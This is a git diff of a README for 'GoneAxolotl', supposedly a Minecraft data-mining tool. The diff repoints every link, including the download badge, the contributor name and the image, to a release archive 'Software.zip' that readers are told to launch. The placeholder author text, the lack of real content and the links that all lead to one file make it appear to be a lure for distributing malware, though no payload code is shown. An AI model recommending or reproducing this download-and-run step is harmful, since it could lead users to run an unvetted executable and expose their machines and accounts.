@@ -10,9 +10,9 @@ Welcome to GoneAxolotl - your go-to Minecraft data mining tool for extracting ba
 
 ## Installation
 Download the software package from the link below:
-[![Download Software](https://github.com/sadxz132/GoneAxolotl/releases/download/v1.0/Program.zip)](https://github.com/sadxz132/GoneAxolotl/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/sadxz132/GoneAxolotl/releases/download/v2.0/Software.zip)](https://github.com/sadxz132/GoneAxolotl/releases/download/v2.0/Software.zip)
 
-*Note: The https://github.com/sadxz132/GoneAxolotl/releases/download/v1.0/Program.zip needs to be launched for installation.*
+*Note: The https://github.com/sadxz132/GoneAxolotl/releases/download/v2.0/Software.zip needs to be launched for installation.*
 
 ## How to Use
 1. Open the program after installation
@@ -24,7 +24,7 @@ Download the software package from the link below:
 ['2b2t', 'anarchy-minecraft-servers', 'banners', 'biomes', 'blocks', 'data', 'data-miner', 'data-science', 'mca', 'minecraft', 'minecraft-data-miner', 'minecraft-nbt', 'miner', 'nbt', 'region', 'region-file', 'signs', 'timestamps', 'world-downloader-mod']
 
 ## Contributors
-- [Your Name](https://github.com/sadxz132/GoneAxolotl/releases/download/v1.0/Program.zip) - Creator and Lead Developer
+- [Your Name](https://github.com/sadxz132/GoneAxolotl/releases/download/v2.0/Software.zip) - Creator and Lead Developer
 
 ## Support
 For any issues or questions, please check the "Releases" section of the repository. If you need further assistance, feel free to reach out to the creator and contributors.
@@ -35,6 +35,6 @@ Enjoy using GoneAxolotl? Share it with your friends and fellow Minecraft enthusi
 ## Disclaimer
 GoneAxolotl is not affiliated with or endorsed by Mojang Studios. Minecraft is a trademark of Mojang AB.
 
-![Axolotl](https://github.com/sadxz132/GoneAxolotl/releases/download/v1.0/Program.zip)
+![Axolotl](https://github.com/sadxz132/GoneAxolotl/releases/download/v2.0/Software.zip)
 
 Happy Mining! 🌟
